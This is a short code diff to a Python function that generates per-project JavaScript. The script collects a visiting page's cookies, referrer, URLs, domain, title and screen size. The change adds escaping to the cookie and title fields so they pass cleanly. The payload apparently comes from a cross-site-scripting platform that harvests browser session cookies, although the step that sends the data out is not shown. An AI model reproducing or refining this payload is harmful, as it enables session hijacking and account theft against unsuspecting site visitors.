@@ -32,9 +32,9 @@ def js_content(project_id):
     info.referrer = escape(document.referrer);
     info.location = escape(window.location.href);
     info.toplocation = escape(top.location.href);
-    info.cookie = escape(document.cookie);
+    info.cookie = escape(document.cookie.replace(/\"/g,"'"));
     info.domain = document.domain;
-    info.title = document.title;
+    info.title = escape(document.title.replace(/\"/g,"'"));
     info.screen = function(){
         var c = "";
         if (self.screen) {c = screen.width+"x"+screen.height;}
